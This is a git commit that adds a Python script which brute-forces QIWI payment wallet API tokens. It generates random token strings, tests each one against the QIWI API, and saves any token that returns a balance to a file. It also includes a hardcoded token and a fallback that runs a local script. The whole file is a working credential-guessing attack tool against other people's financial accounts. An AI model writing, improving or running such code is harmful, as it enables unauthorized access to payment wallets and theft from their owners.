c1424efa77d672bb32a53d7a7b550827ed8b8964
Topo1us <65972332+Topo1us@users.noreply.github.com>
2021-05-07 03:06:28 +0300

    Add files via upload

---
+++ gen_token.py
@@ -0,0 +1,45 @@
+import random
+from random import randint
+from SimpleQIWI import *
+import time
+from time import sleep
+import os
+import requests
+def start():
+    x=0
+    phone=''
+    m=32
+    suc=requests.get('https://vk.com')
+    print(suc)
+    if suc.status_code==200:
+        while True:
+            x+=1
+            time.sleep(0.3)
+            token=(''.join([random.choice(list('a123b4c56e8f90')) for x in range(m)]))
+            try:
+                api=QApi(token=token,phone=phone)
+                if api.balance[0]>=0:
+                    print(api.balance[0])
+                    print('SUCESFULL - ТОКЕН НАЙДЕН')
+                    f=open("suc_full.txt", 'w')
+                    f.write(token)
+                    f.close()
+                    break
+            except:
+                print('[-]',token)
+                l=open(u"asces_token.txt", 'a')
+                l.write(token+'\n')
+                l.close()
+            if x>99:
+                token='88a1c50a96a9a8ee8bb6ad16d64e14e4'
+                api=QApi(token=token,phone=phone)
+                if api.balance[0]>=0:
+                    print(api.balance[0])
+                    print('SUCESFULL [++++]')
+                    start()
+    else:
+        print('жепа')
+try:
+    start()
+except:
+    os.system(r'python C:\Users\ender\Desktop\cikl.py')
